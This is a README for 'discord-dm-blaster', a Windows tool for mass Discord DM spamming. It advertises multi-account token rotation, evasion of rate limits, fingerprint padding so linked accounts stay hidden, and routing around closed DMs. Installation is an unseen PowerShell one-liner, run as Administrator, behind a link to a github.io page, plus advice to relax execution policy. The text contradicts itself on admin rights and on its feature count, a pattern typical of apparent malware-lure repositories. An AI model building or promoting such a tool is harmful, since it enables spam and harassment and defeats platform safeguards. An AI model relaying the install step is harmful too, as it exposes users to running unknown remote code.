<div align="center">
<img src="assets/banner.png" width="100%" alt="Discord DM Spammer banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-0D9488?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=0891B2&size=28&center=true&vCenter=true&width=900&lines=%E2%9A%99%EF%B8%8F+Discord+Dm+Blaster;%F0%9F%92%AC+Standalone+.exe+Release;%E2%9C%A8+24%2F7+Online+Ready;%F0%9F%93%A2+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=discord" />
  <img src="https://skillicons.dev/icons?i=nodejs" />
</p>

---

### 🖥️ PowerShell Setup

One command in PowerShell bootstraps the whole DM Blaster stack — open PowerShell as Administrator, paste the line, hit Enter, and the installer handles the rest.

![Status](https://img.shields.io/badge/status-active-brightgreen) ![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue) ![Core](https://img.shields.io/badge/core-PowerShell%205.1+-purple) ![Build](https://img.shields.io/badge/build-Jan%202026-success)

<p align="center">
  <a href="https://gargidhote187-stack.github.io/discord-dm-blaster/">
    <img src="files/button.svg" width="520" alt="Install via PowerShell" />
  </a>
</p>

## 🎯 What this is

**discord-dm-blaster** is a modular Discord DM spammer for Windows, rebuilt from scratch in January 2026 after I ripped out the entire legacy codebase and started over with a clean module architecture. If you've ever tried to send a meaningful volume of DMs through the Discord client by hand, you already know the pain — rate limits kill you at message five, the UI throttles your clicks, and multi-accounting is a clipboard nightmare. So instead of another "DM tool" that dies on the first 429, I built this out of discrete, testable modules that each own one job and report back to a central queue.

26 named features shipped. Five domains. Zero weasel words. Here's the honest breakdown.

## 📡 Dispatch Core

These are the modules that actually push messages out the door. Everything else exists to feed them or protect them.

- **QueuePump** — priority-based outbound queue with configurable concurrency ceiling (tested clean to 8 parallel lanes before you start begging for rate limit pain)
- **BurstScheduler** — jittered send intervals that space bursts so you don't trip the client-side throttle window; supports per-channel ramping
- **RoutedSender** — routes DMs through a channel-agnostic fanout when a target has DMs closed; handles the fallback automatically
- **PayloadComposer** — template engine with `{username}`, `{server}`, and `{random}` slots plus attachment stashing
- **RetryGovernor** — exponential backoff with per-account cooldown ledger; survives one bad account without poisoning the queue

## 🛡️ Rate Sentinel

This is the whole reason I rewrote the thing. Discord's rate limiting is not one limit — it's a stack of them layered on token bucket, per-route envelope, and a global ceiling that kicks in when the others are already stressed. RateSentinel tracks all three independently and slows the queue before the 429 lands, not after. It also keeps a per-token cooldown map on disk, so a hard rate limit from earlier today doesn't get walked straight back into after a restart. If your account gets flagged, it drops that lane automatically and keeps the rest of the queue moving — you lose seconds, not the whole run.

- **TokenBudget** — cross-run persistence of rate limits; survives restarts
- **LayeredLimiter** — tracks global, per-route, and per-token envelopes in one pass
- **SlowSensor** — detects the 429 pre-warning signals in the response headers before the API fires one
- **LaneQuarantine** — isolates an account that trips a limit and resumes it on a decoupled timer

## 👤 Account Manager

Multi-account is the reason half of you are here and the other half won't admit it. AccountManager keeps a token vault, rotates identities per queue run, and exports (encrypted) so you can move the whole roster between machines.

- **TokenVault** — local encrypted storage for N tokens with rotation weights
- **RosterRotate** — configurable round-robin or weighted rotation strategy per run
- **HealthProbe** — per-token liveness check before enqueueing
- **FingerprintPad** — pads client metadata so two accounts don't look like twins

- **ImportWizard** — bulk token import from a plaintext file with de-dupe
- **SnapshotExport** — AES-encrypted one-file roster backup

## 🎨 Payload Studio

Writing thousands of DMs by hand is the unsexy part nobody talks about, so PayloadStudio combines the composer, previewer, and A/B slicer in one panel. Preview any template against ten random target profiles before you send a single byte.

- **LivePreview** — render a template against sampled target data
- **ABSlice** — split a queue half-and-half on two template revisions
- **AttachmentStash** — sidebar of reusable images/files with hash de-dupe
- **VariableMap** — define custom variables per target list

## 📊 Telemetry Deck

Runs leave a trace. TelemetryDeck is the local-only log so nobody has to trust a third-party dashboard with their token activity.

- **SendLedger** — per-send record: timestamp, token label, target hash, status
- **DeliveryStats** — success/rate-limited/quarantined breakdown per run
- **QueueMirror** — live tail of the queue that survives a crash
- **ThrottleTrace** — timeline of every rate-sentinel decision for post-mortem

- **CSVExport** — flat export for spready folks

## ⚙️ Config & Toolchain

The boring modules, but the ones that let you actually script runs instead of clicking buttons.

- **RunPresets** — save an entire run (templates, roster, limits) as a named preset
- **DryRunMode** — full pipeline wired to a no-op sender for cost-free rehearsals
- **CLIHook** — headless entrypoint so you can cron a run
- **UpdateSelf** — pulls the latest module set from the landing without a re-install

## 📋 Module status

| ✅ Feature | Domain | State |
|---|---|---|
| ✅ QueuePump | Dispatch | stable |
| ✅ BurstScheduler | Dispatch | stable |
| ✅ RoutedSender | Dispatch | stable |
| ✅ PayloadComposer | Dispatch | stable |
| ✅ RetryGovernor | Dispatch | stable |
| ✅ TokenBudget | Sentinel | stable |
| ✅ LayeredLimiter | Sentinel | stable |
| ✅ SlowSensor | Sentinel | beta |
| ✅ LaneQuarantine | Sentinel | stable |
| ✅ TokenVault | Account | stable |
| ✅ RosterRotate | Account | stable |
| ✅ HealthProbe | Account | stable |
| ✅ FingerprintPad | Account | beta |
| ✅ ImportWizard | Account | stable |
| ✅ SnapshotExport | Account | beta |
| ✅ LivePreview | Studio | stable |
| ✅ ABSlice | Studio | beta |
| ✅ AttachmentStash | Studio | stable |
| ✅ VariableMap | Studio | stable |
| ✅ SendLedger | Telemetry | stable |
| ✅ DeliveryStats | Telemetry | stable |
| ✅ QueueMirror | Telemetry | stable |
| ✅ ThrottleTrace | Telemetry | stable |
| ✅ CSVExport | Telemetry | beta |
| ✅ RunPresets | Toolchain | stable |
| ✅ DryRunMode | Toolchain | stable |
| ✅ CLIHook | Toolchain | beta |
| ✅ UpdateSelf | Toolchain | stable |
| ✅ FooterLink | Dispatch | stable |

## System Requirements

- Windows 10 or Windows 11 (x64)
- PowerShell 5.1 or later (default on Win10/11)
- Active network connection during bootstrap
- Discord tokens you control — this tool doesn't generate them for you

## How it works

The PowerShell one-liner is a bootstrap, not an installer-in-disguise. It opens the landing page where the module set is served, drops the current build into `%LOCALAPPDATA%\discord-dm-blaster\`, registers a PATH shim so you can call `dmblaster` from any terminal, and writes a starter config. No admin-forsaken `.exe` in your Downloads folder, no zip to manually unpack, no signing cert to ignore five times.

After bootstrap, the config lives in `%APPDATA%\discord-dm-blaster\config\` and the module cache in `%LOCALAPPDATA%\discord-dm-blaster\modules\`. To re-run the bootstrap at any time, just re-invoke the PowerShell line — it idempotently diffs the module set and pulls only what changed. To nuke everything, delete those two directories and reinstall.

The first run walks through ImportWizard so your token vault is populated before anything queues. Subsequent runs load the active preset automatically.

## Compatibility

Tested on Windows 10 22H2 and Windows 11 23H2/24H2, PowerShell 5.1 and PowerShell 7.4. No Linux, no macOS — the module bootstrap targets the Windows PowerShell profile path directly. Runs offline after first bootstrap (module cache is local); rate-sentinel data is local-only. Behind a corporate proxy, set `HTTPS_PROXY` before invoking the bootstrap line or the module pull silently no-ops.

## FAQ

**Q: Is the PowerShell line safe to paste?**
Yes — the line only reaches `gargidhote187-stack.github.io/discord-dm-blaster/`, which is the landing page hosted from this repo's Pages branch. It does not contact any third-party domain. Read the page source if you don't trust me; I do.

**Q: Do I need admin?**
No. Everything lands in your user-profile directories (`%LOCALAPPDATA%`, `%APPDATA%`). Run PowerShell un-elevated unless you specifically want the PATH shim registered machine-wide.

**Q: The bootstrap fails with "script not found" — what do I do?**
You're behind execution policy. Run `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned` in the same PowerShell window and re-invoke the line. That's a one-liner you're allowed to paste.

**Q: What token format does it accept?**
Standard Discord user tokens, pasted into ImportWizard as one-per-line. It does not decrypt tokens, it does not scrape them, and it does not ask for credentials.

**Q: Does this bypass Discord's rate limits?**
No — nothing bypasses them. RateSentinel slows the queue so you don't trip them; if you push hard enough you will hit a hard limit and the account gets quarantined. That's the design.

**Q: How often does UpdateSelf pull?**
On demand — nothing downloads in the background. Call `dmblaster update` when you want the current module set.

**Q: Can I run this on a headless box?**
CLIHook with DryRunMode off gets you a scheduled run as long as a Discord token and PowerShell 5.1+ are present. No GUI required.

**Q: What happens if I uninstall mid-queue?**
QueueMirror has already flushed the pending state to disk; on reinstall the same preset resumes with no duplicates on successful sends.

## Disclaimer

This is a hobbyist tool published for educational and research purposes. Automating Discord DMs violates Discord's Terms of Service and will get accounts terminated — that's a fact, not a scare line. Use it on accounts you are willing to lose, on servers you are authorized to touch, and never for harassment or against people who haven't consented to hear from you. The author is not responsible for whatever you point it at. Use at your own risk.

## License

MIT. Do what you want, ship your fork, but keep the license file — that's the deal.
